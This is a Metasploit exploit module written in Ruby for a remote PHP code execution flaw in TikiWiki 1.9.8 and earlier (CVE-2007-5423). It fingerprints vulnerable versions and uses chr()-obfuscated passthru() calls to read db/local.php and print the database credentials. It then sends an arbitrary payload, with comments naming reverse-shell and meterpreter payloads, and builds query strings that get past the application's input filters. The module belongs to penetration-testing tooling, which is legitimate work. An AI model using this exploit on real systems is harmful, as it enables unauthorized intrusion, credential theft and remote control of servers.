##
# $Id: tikiwiki_graph_formula_exec.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TikiWiki tiki-graph_formula Remote PHP Code Execution',
			'Description'    => %q{
					TikiWiki (<= 1.9.8) contains a flaw that may allow a remote
				attacker to execute arbitrary PHP code.  The issue is due to
				'tiki-graph_formula.php' script not properly sanitizing user
				input supplied to create_function(), which may allow a remote
				attacker to execute arbitrary PHP code resulting in a loss of
				integrity.
			},
			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2007-5423'],
					['OSVDB', '40478'],
					['BID', '26006'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					# 6k.  Really it's the max length of a URI minus the junk
					# we have to put in the request to trigger the
					# vulnerability.  On Apache, 8190 is the max, so this
					# should be a pretty safe value.
					'Space'       => 6144,
					# Yes, 'x' is a badchar.  The vulnerable code replaces it with '$x'.
					'BadChars'    => "`\"' %&x",
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Oct 10 2007',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [true, "TikiWiki directory path", "/tikiwiki"]),
			], self.class)
	end

	def check
		res = send_request_raw(
			{
				'uri'     => datastore['URI'] + "/tiki-index.php",
				'method'  => 'GET',
				'headers' =>
					{
						'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
						'Connection' => 'Close',
					}
			}, 5)

		http_fingerprint({ :response => res })  # check method

		if (res and res.code == 200 and res.body.match(/TikiWiki v?([0-9\.]*)/))
			ver = $1
			#print_status("Detected TikiWiki version #{ver}")
			ver = ver.split('.')
			return Exploit::CheckCode::Safe if (ver[0] != '1')
			return Exploit::CheckCode::Safe if (ver[1] != '9')
			if (ver.length > 2)
				ver2 = ver[2].to_i
				if (ver.length > 3)
					ver3 = ver[3].to_i
				else
					ver3 = 0
				end
				return Exploit::CheckCode::Safe if (ver2 > 8)
				return Exploit::CheckCode::Safe if (ver2 == 8 and ver3 > 0)
			end
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end

	def exploit

		print_status("Attempting to obtain database credentials...")
		url_db_local = build_uri("passthru(" +
			"chr(101).chr(99).chr(104).chr(111).chr(32).chr(89).chr(89).chr(89)." +  # echo YYY
			"chr(59)." +  # ;
			# cat db/local.php
			"chr(99).chr(97).chr(116).chr(32).chr(100).chr(98).chr(47).chr(108).chr(111).chr(99).chr(97).chr(108).chr(46).chr(112).chr(104).chr(112)." +
			"chr(59)." +  # ;
			"chr(101).chr(99).chr(104).chr(111).chr(32).chr(89).chr(89).chr(89)" +   # echo YYY
			")")
		res = send_request_raw({
			'uri'     => url_db_local,
			'method'  => 'GET',
			'headers' =>
				{
					'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
					'Connection' => 'Close',
				}
			}, 5)
		if (res and res.message == "OK" and res.body)
			print_status("The server returned            : #{res.code} #{res.message}")
			print_status("Server version                 : #{res.headers['Server']}")

			db_tiki   = res.body.match(/db_tiki='(.*?)';/m)
			if (db_tiki)
				dbversion = res.body.match(/dbversion_tiki='(.*?)';/m)
				host_tiki = res.body.match(/host_tiki='(.*?)';/m)
				user_tiki = res.body.match(/user_tiki='(.*?)';/m)
				pass_tiki = res.body.match(/pass_tiki='(.*?)';/m)
				dbs_tiki  = res.body.match(/dbs_tiki='(.*?)';/m)

				print_status("TikiWiki database informations : \n")

				print("db_tiki   : " + db_tiki[1]   + "\n")
				print("dbversion : " + dbversion[1] + "\n")
				print("host_tiki : " + host_tiki[1] + "\n")
				print("user_tiki : " + user_tiki[1] + "\n")
				print("pass_tiki : " + pass_tiki[1] + "\n")
				print("dbs_tiki  : " + dbs_tiki[1]  + "\n\n")
			end
		else
			print_status("No response from the server")
		end


		print_status("Attempting to execute our payload...")
		command = Rex::Text.uri_encode(payload.encoded)
		url_cmd = build_uri(payload.encoded)
		res = send_request_raw({
			'uri'     => url_cmd,
			'method'  => 'GET',
			'headers' =>
				{
					'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
					'Connection' => 'Close',
				}
			}, 5)
	end

	#
	# This function will build a fairly randomish query string to be used
	# when exploiting this vulnerability :)
	#
	def build_uri(f_val)
		uri = ''
		uri << datastore['URI']
		uri << "/tiki-graph_formula.php?"

		# Requirements:
		query = ''

		# 1. w,h,s,min,max must all be numeric
		vars = %w{ w h s min max }
		min = nil
		vars.each { |el|
			query << "&" if query.length > 0
			num = 1+rand(999)
			# 2. min must be less than max
			case el
			when 's'
				num = 1+rand(500)
			when 'min'
				if (min)
					num = min
				else
					min = num
				end
			when 'max'
				min ||= num
				num = min + 1 + rand(99)
			end
			query << "#{el}=#{num}"
		}

		# 3. cannot use `, ', ", or space
		if (f_val.index('\'') or f_val.index('"') or f_val.index('`') or f_val.index(' '))
			raise RuntimeError, "The value for the 'f' variable contains an invalid character!"
		end

		# 4. the function must be one of:
		valid = %w{
			abs acos acosh asin asinh atan2 atan atanh ceil cos cosh deg2rad
			exp expm1 floor fmod hypot log10 log1p log max min pi pow rad2deg round sin
			sinh sqrt tan tanh
		}
		func = valid[rand(valid.length)]

		# 5. f must be an array
		query << "&" if query.length > 0

		# Strip off the semi-colon that the encoder insists on including.
		if f_val[-1,1] == ";"
			f_val = f_val[0,f_val.length-1]
		end
		query << "f[]=x.#{func}.#{f_val}"

		# This doesn't seem to be necessary on PHP 5.2.4, tikiwiki 1.9.5
		# Tested with php/reverse_php, php/meterpreter_reverse_tcp, and
		# php/meterpreter/reverse_tcp
		#  -egypt
		# If we dont kill php here it spins eating 100% cpu :-/
		#query << '.die()'

		# 6. two options for 't' - png and pdf
		#    - png requires php's gd extension
		#    - pdf, if you set 'p', requires php pdf extension
		#  -- we always use 'pdf' with a null 'p'
		query << "&" if query.length > 0
		query << 't=pdf'

		# 7. title must be set
		query << '&title='

		uri << query
		uri
	end

end
